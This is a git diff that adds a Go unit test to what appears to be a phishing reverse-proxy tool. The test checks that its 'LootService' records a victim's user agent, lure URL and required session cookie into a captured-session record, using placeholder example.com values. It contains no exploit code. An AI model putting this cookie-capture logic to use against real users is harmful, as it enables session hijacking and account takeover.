@@ -1408,6 +1408,70 @@ func TestLootServiceSaveCookiesOneRequiredSaveExpired(t *testing.T) {
 	require.Equal(t, 1, called, "sessionRepository is called invalid number of times")
 }
 
+func TestLootServiceSaveUserAgentWithOneRequiredCookie(t *testing.T) {
+
+	app := fiber.New()
+	c := app.AcquireCtx(&fasthttp.RequestCtx{})
+	defer app.ReleaseCtx(c)
+	store := session.New()
+	websess, err := store.Get(c)
+	require.NoError(t, err)
+	setSession(c, websess)
+	setLureURL(websess, "/abc/def")
+
+	const userAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+	c.Request().Header.Add("User-Agent", userAgent)
+
+	called := 0
+	sessionRepo := mockSessionRepositoryFunc(func(sess *DBCapturedSession) error {
+		called++
+		require.Equal(t, &DBCapturedSession{
+			UserAgent: userAgent,
+			LureURL:   "/abc/def",
+			SessionID: websess.ID(),
+			Cookies: []*SessionCookie{
+				{
+					Name:           "sessionid",
+					Value:          "Value1",
+					Path:           "/",
+					Domain:         "example.com",
+					ExpirationDate: 1643767322.123123,
+					HTTPOnly:       true,
+					Secure:         true,
+					SameSite:       "no_restriction",
+					Session:        false,
+				},
+			},
+		}, sess)
+		return nil
+	})
+	s := NewLootService(nil, sessionRepo, []*SessionCookieConfig{
+		{
+			Name:     "sessionid",
+			Domain:   "example.com",
+			Required: true,
+		},
+	})
+
+	destURL := &url.URL{Scheme: "https", Host: "www.example.com", Path: "/"}
+	s.SaveUserAgent(c)
+	err = s.SaveCookies(c, destURL, []*http.Cookie{
+		{
+			Name:     "sessionid",
+			Value:    "Value1",
+			Path:     "/",
+			Domain:   "example.com",
+			Expires:  time.Date(2022, 2, 2, 2, 2, 2, 123123000, time.UTC),
+			HttpOnly: true,
+			Secure:   true,
+			SameSite: http.SameSiteNoneMode,
+		},
+	})
+	require.NoError(t, err)
+
+	require.Equal(t, 1, called, "sessionRepository is called invalid number of times")
+}
+
 type mockSessionRepositoryFunc func(sess *DBCapturedSession) error
 
 func (f mockSessionRepositoryFunc) SaveSession(sess *DBCapturedSession) error {
